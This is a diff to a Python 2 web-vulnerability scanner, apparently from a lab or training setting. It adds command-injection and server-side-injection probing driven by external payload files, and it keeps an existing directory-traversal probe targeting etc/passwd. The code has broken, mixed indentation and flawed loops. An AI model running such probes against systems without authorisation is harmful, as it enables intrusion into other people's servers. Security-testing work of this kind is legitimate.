@@ -1,10 +1,12 @@
+import requests 
+from requests import Request, Session
+from pprint import pprint
+from urlparse import urlparse
 import binascii
 import copy
 import difflib
 import os
-from requests import Request, Session
-from pprint import pprint
-from urlparse import urlparse
+
 
 CONFIG_SQLI_SLEEP_TIME = 3
 
@@ -38,12 +40,96 @@ DIR_TRAVERSAL_PROBES = [
 	".//" + "..//" * 9 + "etc//passwd",
 ]
 
+with open('commandInjPayloads.txt') as f:
+ commandExecList = list(f)
+
+with open('serverSidePayloads.txt') as f:
+ serverInjectList = list(f)
+
+
+
 session = Session()
 
 def scan(url, params):
 	print("\n[*] Scanning: %s" % url)
 	print("[*] Known Params:")
 	pprint(params)
+
+	#Command Injection
+	initial_length = ""
+	for method in params.keys():
+	 method_params = params[method]
+
+	for key, value in method_params.items():
+	 response = requests.post(url,data=method_params) 
+	 initial_length = response.headers['content-length']
+	 print "Initial response content length: " + str(response.headers['content-length'])
+	
+        for x in commandExecList:
+	 for key, value in method_params.items():
+    	  method_params[key] = x.replace("\n", "")
+	 
+	  response = make_request(method, url, method_params)
+	  print "\nPayload used: " + str(method_params)
+	  print "Elasped Time: " + str(response.elapsed.total_seconds())
+          print "Response content: " + response.content
+	  print "Response content length: " + str(response.headers['content-length'])
+	
+	  delta = int(response.headers['content-length']) - int(initial_length)
+		
+	  if response.content.find("gaw4f4sdaf12f") != -1:
+	   print "Vulnerable to command injection! #1"
+
+	  elif response.content.find("/bin") != -1:
+	   print "Vulnerable to command injection! #2"
+	
+	  elif response.content.find("uid=") != -1:
+      	   print "Vulnerable to command injection! #3"
+		 
+      	  elif response.elapsed.total_seconds() > 25:
+	   print "Vulnerable to blind command injection!"
+
+	  elif delta > 50:
+ 	   print "Vulnerable to command injection! #4"
+	
+	
+     
+	#Server Side Injection
+	initial_length = ""
+	
+	for method in params.keys():
+	 method_params = params[method]
+
+	for key, value in method_params.items():
+	 response = requests.post(url,data=method_params) 
+	 initial_length = response.headers['content-length']
+	 print "Initial response content length: " + str(response.headers['content-length'])
+
+
+        for x in serverInjectList:
+	 for key, value in method_params.items():
+    	  method_params[key] = x.replace("\n", "")
+
+	  response = make_request(method, url, method_params)
+          print "\nPayload used: " + str(method_params)
+	  print "Elasped Time: " + str(response.elapsed.total_seconds())
+          print "Response content: " + response.content
+	  print "Response content length: " + str(response.headers['content-length'])
+			
+	  delta = int(response.headers['content-length']) - int(initial_length)
+
+	  if response.content.find("vq3rio13dj8x") != -1:
+	   print "Vulnerable to sever side injection! #1"
+	 	 
+	  elif response.content.find("/bin") != -1:
+           print "Vulnerable to sever side injection! #2"
+		 
+      	  elif response.elapsed.total_seconds() > 12:
+	   print "Vulnerable to blind sever side injection"
+
+	  elif delta > 50:
+	   print "Vulnerable to sever side injection! #3"
+	
 
 	# Check for open redirects
 	# ========================
@@ -119,10 +205,13 @@ def make_request(method, url, params):
 		return session.post(url, data=params)
 	elif method == 'GET':
 		return session.get(url, params=params)
+
 	else:
 		raise ValueError("Unknown method %s" % method)
 
 if __name__ == '__main__':
-	scan('http://192.168.56.101/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
-	scan('http://192.168.56.101/sqli/sqli.php', {'POST': {'username': None}})
-	scan('http://192.168.56.101/directorytraversal/directorytraversal.php', {'GET': {'ascii': 'angry.ascii'}})
+	#scan('http://target.com/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
+	#scan('http://target.com/sqli/sqli.php', {'POST': {'username': None}})
+	#scan('http://target.com/directorytraversal/directorytraversal.php', {'GET': {'ascii': 'angry.ascii'}})
+	scan('http://target.com/commandinjection/commandinjection.php', {'POST': {'host': '8.8.8.8'}})
+	#scan('http://target.com/serverside/serverside.php', {'GET': {'language': 'apples'}})
